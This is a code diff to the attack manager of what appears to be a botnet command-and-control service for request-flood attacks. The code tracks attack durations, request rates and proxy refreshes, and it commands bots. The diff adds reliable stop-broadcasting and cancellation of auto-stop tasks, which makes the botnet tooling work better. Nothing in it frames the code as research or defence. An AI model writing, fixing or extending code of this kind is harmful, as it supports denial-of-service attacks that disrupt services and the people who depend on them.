@@ -24,10 +24,10 @@ class AttackManager:
         self._stop_event = asyncio.Event()
         self._lock = asyncio.Lock()
         self._botnet_manager = None  # Lazy loaded
+        self._auto_stop_tasks: Dict[str, asyncio.Task] = {}
 
     @property
     def botnet_manager(self):
-        """Lazy load botnet_manager to avoid circular import."""
         if self._botnet_manager is None:
             from app.managers.botnet_manager import botnet_manager
             self._botnet_manager = botnet_manager
@@ -119,7 +119,10 @@ class AttackManager:
         self.attack_tasks[attack_id] = task
 
         total_duration = req.duration + (req.hold_time or 0)
-        asyncio.create_task(self._auto_finalize(attack_id, total_duration))
+
+        # FIX #1: Store auto-stop task so we can cancel it on manual stop
+        auto_task = asyncio.create_task(self._auto_finalize(attack_id, total_duration))
+        self._auto_stop_tasks[attack_id] = auto_task
 
         if req.duration > 300:
             asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))
@@ -145,7 +148,26 @@ class AttackManager:
 
         if attack_id in self.active_attacks:
             logger.info(f"[AUTO] Auto-finalizing attack {attack_id} after {total_duration}s")
+            # FIX #2: Broadcast stop to bots BEFORE finalizing
+            await self._broadcast_stop_to_bots(attack_id)
             await self._finalize_attack(attack_id)
+        else:
+            logger.debug(f"[AUTO] Attack {attack_id} already finalized, skipping")
+
+    async def _broadcast_stop_to_bots(self, attack_id: str):
+        """FIX: Always broadcast stop to bots when attack ends."""
+        try:
+            bot_ids = await self.botnet_manager.get_active_bot_ids()
+            if bot_ids:
+                logger.info(f"[STOP] Broadcasting stop for {attack_id} to {len(bot_ids)} bots")
+                await self.botnet_manager.broadcast_command({
+                    "cmd": "stop",
+                    "attack_id": attack_id
+                })
+            else:
+                logger.debug(f"[STOP] No bots to broadcast stop for {attack_id}")
+        except Exception as e:
+            logger.error(f"[STOP] Error broadcasting stop to bots: {e}")
 
     async def _mid_attack_proxy_refresh(self, attack_id: str, duration: int):
         refresh_interval = 180
@@ -187,14 +209,21 @@ class AttackManager:
                     pass
                 del self.attack_tasks[attack_id]
 
+            # FIX #3: Cancel auto-stop task
+            if attack_id in self._auto_stop_tasks:
+                self._auto_stop_tasks[attack_id].cancel()
+                try:
+                    await self._auto_stop_tasks[attack_id]
+                except asyncio.CancelledError:
+                    pass
+                del self._auto_stop_tasks[attack_id]
+
             attack = self.active_attacks.pop(attack_id, None)
 
         await self._remove_attack_from_redis(attack_id)
 
-        await self.botnet_manager.broadcast_command({
-            "cmd": "stop",
-            "attack_id": attack_id
-        })
+        # FIX #4: Broadcast stop to bots
+        await self._broadcast_stop_to_bots(attack_id)
 
         if attack:
             avg_rps = attack.total_requests // max(1, attack.duration)
@@ -218,6 +247,16 @@ class AttackManager:
         for aid in attack_ids:
             if await self.stop_attack(aid):
                 count += 1
+        # FIX #5: Also broadcast global stop to all bots
+        try:
+            bot_ids = await self.botnet_manager.get_active_bot_ids()
+            if bot_ids:
+                logger.info(f"[STOPALL] Broadcasting stop-all to {len(bot_ids)} bots")
+                await self.botnet_manager.broadcast_command({
+                    "cmd": "stop"
+                })
+        except Exception as e:
+            logger.error(f"[STOPALL] Error broadcasting stop-all: {e}")
         return count
 
     def get_active_attacks(self) -> List[AttackStatus]:
@@ -255,7 +294,8 @@ class AttackManager:
                 total_duration = attack.duration + (attack.hold_time or 0)
                 elapsed = attack.elapsed
                 remaining = max(0, total_duration - elapsed)
-                asyncio.create_task(self._auto_finalize(aid, remaining))
+                auto_task = asyncio.create_task(self._auto_finalize(aid, remaining))
+                self._auto_stop_tasks[aid] = auto_task
                 restored += 1
                 log_attack_event(aid, "restored", {
                     "method": attack.method,
@@ -363,6 +403,8 @@ class AttackManager:
             attack = self.active_attacks.pop(attack_id, None)
             if attack_id in self.attack_tasks:
                 del self.attack_tasks[attack_id]
+            if attack_id in self._auto_stop_tasks:
+                del self._auto_stop_tasks[attack_id]
 
             await self._remove_attack_from_redis(attack_id)
 
